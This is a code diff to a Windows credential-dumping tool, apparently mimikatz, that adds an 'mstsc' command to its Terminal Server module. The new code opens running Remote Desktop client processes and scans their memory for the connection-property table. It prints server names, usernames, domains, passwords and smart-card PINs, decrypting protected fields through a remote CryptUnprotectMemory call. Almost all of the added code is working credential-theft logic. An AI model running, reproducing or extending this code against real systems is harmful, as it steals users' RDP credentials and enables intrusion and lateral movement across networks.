@@ -10,7 +10,7 @@ const KUHL_M_C kuhl_m_c_ts[] = {
 	{kuhl_m_ts_sessions,	L"sessions",	NULL},
 	{kuhl_m_ts_remote,		L"remote",		NULL},
 	{kuhl_m_ts_logonpasswords, L"logonpasswords", L"[experimental] try to get passwords from running sessions"},
-//	{kuhl_m_ts_logonpasswords2, L"logonpasswords2", L"[experimental] try to get passwords from running sessions"},
+	{kuhl_m_ts_mstsc, L"mstsc", L"[experimental] try to get passwords from mstsc process"},
 };
 const KUHL_M kuhl_m_ts = {
 	L"ts",	L"Terminal Server module", NULL,
@@ -188,8 +188,7 @@ NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[])
 			{
 				if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
 				{
-					kprintf(L"!!! Warning, false positive can be listed !!!\n");
-
+					kprintf(L"!!! Warning: false positives can be listed !!!\n");
 					kull_m_process_getMemoryInformations(hMemory, kuhl_m_ts_logonpasswords_MemoryAnalysis, hMemory);
 					kull_m_memory_close(hMemory);
 				}
@@ -259,4 +258,206 @@ BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION 
 		}
 	}
 	return TRUE;
+}
+
+NTSTATUS kuhl_m_ts_mstsc(int argc, wchar_t * argv[])
+{
+	KUHL_M_TS_MSTSC_ARG myArgs;
+
+	myArgs.bIsVerbose = kull_m_string_args_byName(argc, argv, L"verbose", NULL, NULL);
+	kprintf(L"!!! Warning: false positives can be listed !!!\n");
+	kull_m_process_getProcessInformation(kuhl_m_ts_mstsc_enumProcess, &myArgs);
+	
+	return STATUS_SUCCESS;
+}
+
+DECLARE_CONST_UNICODE_STRING(uMstscExe, L"mstsc.exe");
+BOOL CALLBACK kuhl_m_ts_mstsc_enumProcess(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
+{
+	HANDLE hProcess;
+	DWORD dwPid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
+	PKUHL_M_TS_MSTSC_ARG pmyArgs;
+
+	if(RtlEqualUnicodeString(&pSystemProcessInformation->ImageName, &uMstscExe, TRUE))
+	{
+		hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, dwPid);
+		if(hProcess)
+		{
+			pmyArgs = (PKUHL_M_TS_MSTSC_ARG) pvArg;
+
+			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &pmyArgs->hMemory))
+			{
+				kprintf(L"\n| PID %u\n", dwPid);
+				kull_m_process_getMemoryInformations(pmyArgs->hMemory, kuhl_m_ts_mstsc_MemoryAnalysis, pvArg);
+				kull_m_memory_close(pmyArgs->hMemory);
+			}
+			CloseHandle(hProcess);
+		}
+	}
+
+	return TRUE;
+}
+
+BOOL CALLBACK kuhl_m_ts_mstsc_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
+{
+	PKUHL_M_TS_MSTSC_ARG pmyArgs = (PKUHL_M_TS_MSTSC_ARG) pvArg;
+	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {pMemoryBasicInformation->BaseAddress, pmyArgs->hMemory};
+	PBYTE CurrentPtr, limite;
+	BOOL decStatus = TRUE;
+	PTS_PROPERTIES_KIWI pProperties;
+
+	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
+	{
+		aLocalBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize);
+		if(aLocalBuffer.address)
+		{
+			if(kull_m_memory_copy(&aLocalBuffer, &aProcess, pMemoryBasicInformation->RegionSize))
+			{
+				for(CurrentPtr = (PBYTE) aLocalBuffer.address, limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize; CurrentPtr + sizeof(ULONGLONG) <= limite; CurrentPtr++)
+				{
+					if(*((PULONGLONG) CurrentPtr) == 0x3dbcaabcd)
+					{
+						pProperties = (PTS_PROPERTIES_KIWI) (CurrentPtr - FIELD_OFFSET(TS_PROPERTIES_KIWI, unkh0));
+
+						if((pProperties->unkd1 >= 10) && (pProperties->unkd1 < 500))
+						{
+							if((pProperties->cbProperties >= 10) && (pProperties->cbProperties < 500))
+							{
+								if(pProperties->pProperties)
+								{
+									if(pmyArgs->bIsVerbose)
+									{
+										kprintf(L"| %p - %p - 0x%08x - %u - %p - %u - %p - %p - %u\n", pProperties->unkp0, pProperties->unkp1, pProperties->unkh0, pProperties->unkd0, pProperties->unkp2, pProperties->unkd1, pProperties->unkp3, pProperties->pProperties, pProperties->cbProperties);
+									}
+									kuhl_m_ts_mstsc_MemoryAnalysis_property(aProcess.hMemory, pProperties->pProperties, pProperties->cbProperties, pmyArgs->bIsVerbose);
+								}
+							}
+						}
+					}
+				}
+			}
+			LocalFree(aLocalBuffer.address);
+		}
+	}
+	return TRUE;
+}
+
+void kuhl_m_ts_mstsc_MemoryAnalysis_property(PKULL_M_MEMORY_HANDLE hMemory, PVOID pvProperties, DWORD cbProperties, BOOL bIsVerbose)
+{
+	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {pvProperties, hMemory}, aDataBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
+	PTS_PROPERTY_KIWI pProperties;
+	BOOL bToDisplay;
+	DWORD i;
+	PSTR szPropertyName;
+	PWSTR szPropertyValue;
+	
+	aLocalBuffer.address = LocalAlloc(LPTR, cbProperties * sizeof(TS_PROPERTY_KIWI));
+	if(aLocalBuffer.address)
+	{
+		if(kull_m_memory_copy(&aLocalBuffer, &aProcess, cbProperties * sizeof(TS_PROPERTY_KIWI)))
+		{
+			pProperties = (PTS_PROPERTY_KIWI) aLocalBuffer.address;
+
+			for(i = 0; i < cbProperties; i++)
+			{
+				if(pProperties[i].szProperty && (pProperties[i].dwType > 0) && (pProperties[i].dwType < 20))
+				{
+					aProcess.address = (LPVOID) pProperties[i].szProperty;
+					szPropertyName = kull_m_process_getImportNameWithoutEnd(&aProcess);
+					if(szPropertyName)
+					{
+						if(	bIsVerbose ||
+							!_strcmpi("ServerName", szPropertyName) ||
+							!_strcmpi("ServerFqdn", szPropertyName) ||
+							!_strcmpi("ServerNameUsedForAuthentication", szPropertyName) ||
+							!_strcmpi("UserSpecifiedServerName", szPropertyName) ||
+							!_strcmpi("UserName", szPropertyName) ||
+							!_strcmpi("Domain", szPropertyName) ||
+							!_strcmpi("Password", szPropertyName) || 
+							!_strcmpi("SmartCardReaderName", szPropertyName) ||
+							!_strcmpi("RDmiUsername", szPropertyName) ||
+							!_strcmpi("PasswordContainsSCardPin", szPropertyName)
+							)
+						{
+							bToDisplay = TRUE;
+						}
+						else bToDisplay = FALSE;
+
+						if(bToDisplay)
+						{
+							kprintf(L"%-40S  ", szPropertyName);
+
+							switch(pProperties[i].dwType)
+							{
+							case 1:
+								kprintf(L"[ dword ] %u (0x%08x)", (DWORD) pProperties[i].pvData, (DWORD) pProperties[i].pvData);
+								break;
+
+							case 2:
+								kprintf(L"[ word? ] %u (0x%04x)", (WORD) pProperties[i].pvData, (WORD) pProperties[i].pvData);
+								break;
+
+							case 3:
+								kprintf(L"[ bool  ] %s", ((BOOL) pProperties[i].pvData) ? L"TRUE" : L"FALSE");
+								break;
+
+							case 4:
+								kprintf(L"[wstring] ");
+								aProcess.address = pProperties[i].pvData;
+								szPropertyValue = kull_m_process_get_wstring_without_end(&aProcess, 1024);
+								if(szPropertyValue)
+								{
+									kprintf(L"\'%s\'", szPropertyValue);
+									LocalFree(szPropertyValue);
+								}
+								break;
+
+							case 6:
+								kprintf(L"[protect] ");
+								if(pProperties[i].pvData && (DWORD) pProperties[i].unkp2)
+								{
+									aDataBuffer.address = (PBYTE) LocalAlloc(LPTR, (DWORD) pProperties[i].unkp2);
+
+									if(aDataBuffer.address)
+									{
+										aProcess.address = pProperties[i].pvData;
+										if(kull_m_memory_copy(&aDataBuffer, &aProcess, (DWORD) pProperties[i].unkp2))
+										{
+											if(pProperties[i].dwFlags & 0x800)
+											{
+												if(kull_m_crypto_remote_CryptUnprotectMemory(aProcess.hMemory, aDataBuffer.address, (DWORD) pProperties[i].unkp2, CRYPTPROTECTMEMORY_SAME_PROCESS))
+												{
+													kprintf(L"\'%.*s\'", *(PDWORD) aDataBuffer.address / sizeof(wchar_t), ((PBYTE) aDataBuffer.address) + sizeof(DWORD));
+												}
+												else PRINT_ERROR(L"CryptUnprotectMemory");
+											}
+											else
+											{
+												kull_m_string_wprintf_hex(aDataBuffer.address, (DWORD) pProperties[i].unkp2, 0);
+											}
+										}
+										LocalFree(aDataBuffer.address);
+									}
+								}
+								break;
+
+							case 7: // ip, blob ?
+							default:
+								kprintf(L"[unk - %u] 0x%p", pProperties[i].dwType, pProperties[i].pvData);
+								break;
+							}
+
+							//kprintf(L" (0x%08x)\n", pProperties[i].dwFlags);
+							kprintf(L"\n");
+						}
+
+						LocalFree(szPropertyName);
+					}
+					else break;
+				}
+				else break;
+			}
+		}
+		LocalFree(aLocalBuffer.address);
+	}
 }
